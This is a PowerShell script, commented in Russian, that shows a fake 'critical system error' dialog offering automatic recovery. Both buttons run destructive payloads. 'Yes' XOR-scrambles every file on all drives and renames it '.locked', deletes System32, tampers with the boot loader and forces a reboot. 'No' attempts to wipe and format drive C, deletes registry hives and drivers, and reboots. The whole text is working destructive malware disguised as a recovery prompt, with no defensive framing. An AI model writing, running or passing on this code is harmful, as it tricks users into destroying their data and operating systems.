Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = 'СИСТЕМНАЯ ОШИБКА'
$form.Size = New-Object System.Drawing.Size(400,200)
$form.StartPosition = 'CenterScreen'
$form.FormBorderStyle = 'FixedDialog'
$form.MaximizeBox = $false
$form.MinimizeBox = $false
$form.Topmost = $true
$form.BackColor = 'Black'
$form.ForeColor = 'Red'

$label = New-Object System.Windows.Forms.Label
$label.Location = New-Object System.Drawing.Point(20,30)
$label.Size = New-Object System.Drawing.Size(350,50)
$label.Text = "КРИТИЧЕСКАЯ ОШИБКА СИСТЕМЫ`nВыполнить автоматическое восстановление?"
$label.TextAlign = 'MiddleCenter'
$label.ForeColor = 'Red'
$form.Controls.Add($label)

$buttonYes = New-Object System.Windows.Forms.Button
$buttonYes.Location = New-Object System.Drawing.Point(80,100)
$buttonYes.Size = New-Object System.Drawing.Size(100,30)
$buttonYes.Text = 'ДА'
$buttonYes.BackColor = 'DarkRed'
$buttonYes.ForeColor = 'White'
$buttonYes.Add_Click({
    $form.Close()
    
    # ПОЛНОЕ УНИЧТОЖЕНИЕ
    Write-Host "УНИЧТОЖЕНИЕ СИСТЕМЫ..." -ForegroundColor Red
    
    # Шифрование всех файлов
    $key = 0x42
    $drives = Get-PSDrive -PSProvider FileSystem
    foreach($drive in $drives) {
        $root = $drive.Root
        Write-Host "Шифрование: $root"
        Get-ChildItem $root -Recurse -ErrorAction SilentlyContinue | Where-Object {!$_.PSIsContainer} | ForEach-Object {
            try {
                $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
                for($i=0;$i -lt $bytes.Length;$i++) {
                    $bytes[$i] = $bytes[$i] -bxor $key
                }
                [System.IO.File]::WriteAllBytes($_.FullName, $bytes)
                Rename-Item $_.FullName "$($_.FullName).locked" -ErrorAction SilentlyContinue
            } catch {}
        }
    }
    
    # Удаление System32
    takeown /f C:\Windows\System32\* /r /d y 2>&1 | Out-Null
    icacls C:\Windows\System32\* /grant everyone:F /t /c /q 2>&1 | Out-Null
    Remove-Item C:\Windows\System32\* -Recurse -Force -ErrorAction SilentlyContinue
    
    # Уничтожение загрузчика
    bootrec /fixmbr | Out-Null
    bootrec /fixboot | Out-Null
    
    Write-Host "СИСТЕМА УНИЧТОЖЕНА. ПЕРЕЗАГРУЗКА..." -ForegroundColor Red -BackgroundColor Black
    shutdown /r /f /t 10
})
$form.Controls.Add($buttonYes)

$buttonNo = New-Object System.Windows.Forms.Button
$buttonNo.Location = New-Object System.Drawing.Point(200,100)
$buttonNo.Size = New-Object System.Drawing.Size(100,30)
$buttonNo.Text = 'НЕТ'
$buttonNo.BackColor = 'DarkGray'
$buttonNo.ForeColor = 'Black'
$buttonNo.Add_Click({
    $form.Close()
    
    # БЫСТРОЕ ФОРМАТИРОВАНИЕ
    Write-Host "ФОРМАТИРОВАНИЕ ДИСКА C:..." -ForegroundColor Yellow
    
    # Отключаем защиту
    diskpart /s @"
select volume C
remove all
clean
create partition primary
format fs=ntfs quick
"@ 2>&1 | Out-Null
    
    # Удаляем важные системные файлы
    Remove-Item C:\Windows\System32\config\* -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item C:\Windows\System32\drivers\* -Recurse -Force -ErrorAction SilentlyContinue
    
    Write-Host "ДИСК C: ОТФОРМАТИРОВАН. ПЕРЕЗАГРУЗКА..." -ForegroundColor Yellow
    shutdown /r /f /t 5
})
$form.Controls.Add($buttonNo)

$form.Add_Shown({$form.Activate()})
$form.ShowDialog()
